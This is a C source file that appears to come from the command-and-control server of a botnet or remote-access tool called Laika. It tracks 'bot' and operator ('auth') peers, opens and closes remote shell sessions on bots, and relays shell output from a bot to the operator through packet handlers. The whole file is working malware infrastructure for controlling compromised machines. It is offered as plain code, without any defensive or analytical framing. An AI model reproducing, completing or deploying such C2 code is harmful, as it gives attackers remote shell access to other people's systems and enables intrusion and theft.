#include "cpeer.h"

#include "cnc.h"
#include "lerror.h"
#include "lmem.h"

/* =======================================[[ Peer Info ]]======================================= */

struct sLaika_peerInfo *allocBasePeerInfo(struct sLaika_cnc *cnc, size_t sz)
{
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)laikaM_malloc(sz);
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        pInfo->shells[i] = NULL;
    }

    pInfo->cnc = cnc;
    pInfo->lastPing = laikaT_getTime();
    pInfo->completeHandshake = false;
    return pInfo;
}

struct sLaika_botInfo *laikaC_newBotInfo(struct sLaika_cnc *cnc)
{
    struct sLaika_botInfo *bInfo =
        (struct sLaika_botInfo *)allocBasePeerInfo(cnc, sizeof(struct sLaika_botInfo));

    /* TODO */
    return bInfo;
}

struct sLaika_authInfo *laikaC_newAuthInfo(struct sLaika_cnc *cnc)
{
    struct sLaika_authInfo *aInfo =
        (struct sLaika_authInfo *)allocBasePeerInfo(cnc, sizeof(struct sLaika_authInfo));

    /* TODO */
    return aInfo;
}

void laikaC_freePeerInfo(struct sLaika_peer *peer, struct sLaika_peerInfo *pInfo)
{
    peer->uData = NULL;
    laikaM_free(pInfo);
}

/* ======================================[[ Shell Info ]]======================================= */

int findOpenShellID(struct sLaika_peerInfo *pInfo)
{
    int id;

    for (id = 0; id < LAIKA_MAX_SHELLS; id++) {
        if (pInfo->shells[id] == NULL)
            return id;
    }

    return -1;
}

struct sLaika_shellInfo *laikaC_openShell(struct sLaika_peer *bot, struct sLaika_peer *auth,
                                          uint16_t cols, uint16_t rows)
{
    struct sLaika_shellInfo *shell =
        (struct sLaika_shellInfo *)laikaM_malloc(sizeof(struct sLaika_shellInfo));

    shell->bot = bot;
    shell->auth = auth;
    shell->cols = cols;
    shell->rows = rows;

    /* find open ids for each peer */
    if ((shell->botShellID = findOpenShellID(GETPINFOFROMPEER(bot))) == -1)
        LAIKA_ERROR("Failed to open new shellInfo for bot %p, all shells are full!\n", bot);

    if ((shell->authShellID = findOpenShellID(GETPINFOFROMPEER(auth))) == -1)
        LAIKA_ERROR("Failed to open new shellInfo for auth %p, all shells are full!\n", auth);

    /* assign ids */
    GETPINFOFROMPEER(bot)->shells[shell->botShellID] = shell;
    GETPINFOFROMPEER(auth)->shells[shell->authShellID] = shell;

    /* send SHELL_OPEN packets */
    laikaS_startOutPacket(bot, LAIKAPKT_SHELL_OPEN);
    laikaS_writeInt(&bot->sock, &shell->botShellID, sizeof(uint32_t));
    laikaS_writeInt(&bot->sock, &cols, sizeof(uint16_t));
    laikaS_writeInt(&bot->sock, &rows, sizeof(uint16_t));
    laikaS_endOutPacket(bot);

    laikaS_startOutPacket(auth, LAIKAPKT_SHELL_OPEN);
    laikaS_writeInt(&auth->sock, &shell->authShellID, sizeof(uint32_t));
    laikaS_writeInt(&auth->sock, &cols, sizeof(uint16_t));
    laikaS_writeInt(&auth->sock, &rows, sizeof(uint16_t));
    laikaS_endOutPacket(auth);

    return shell;
}

void laikaC_closeShell(struct sLaika_shellInfo *shell)
{
    /* send SHELL_CLOSE packets */
    laikaS_startOutPacket(shell->bot, LAIKAPKT_SHELL_CLOSE);
    laikaS_writeInt(&shell->bot->sock, &shell->botShellID, sizeof(uint32_t));
    laikaS_endOutPacket(shell->bot);

    laikaS_startOutPacket(shell->auth, LAIKAPKT_SHELL_CLOSE);
    laikaS_writeInt(&shell->auth->sock, &shell->authShellID, sizeof(uint32_t));
    laikaS_endOutPacket(shell->auth);

    /* unlink */
    GETPINFOFROMPEER(shell->bot)->shells[shell->botShellID] = NULL;
    GETPINFOFROMPEER(shell->auth)->shells[shell->authShellID] = NULL;

    /* free */
    laikaM_free(shell);
}

void laikaC_closeShells(struct sLaika_peer *peer)
{
    struct sLaika_peerInfo *pInfo = GETPINFOFROMPEER(peer);
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if (pInfo->shells[i])
            laikaC_closeShell(pInfo->shells[i]);
    }
}

/* ================================[[ [Peer] Packet Handlers ]]================================= */

void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));

    /* ignore packet if shell isn't open */
    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    /* close shell */
    laikaC_closeShell(shell);
}

void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    /* ignore packet if malformed */
    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH + sizeof(uint32_t) || sz <= sizeof(uint32_t))
        return;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));

    /* ignore packet if shell isn't open */
    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    laikaS_read(&peer->sock, (void *)buf, sz - sizeof(uint32_t));

    /* forward SHELL_DATA packet to auth */
    laikaS_startVarPacket(shell->auth, LAIKAPKT_SHELL_DATA);
    laikaS_writeInt(&shell->auth->sock, &shell->authShellID, sizeof(uint32_t));
    laikaS_write(&shell->auth->sock, buf, sz - sizeof(uint32_t));
    laikaS_endVarPacket(shell->auth);
}
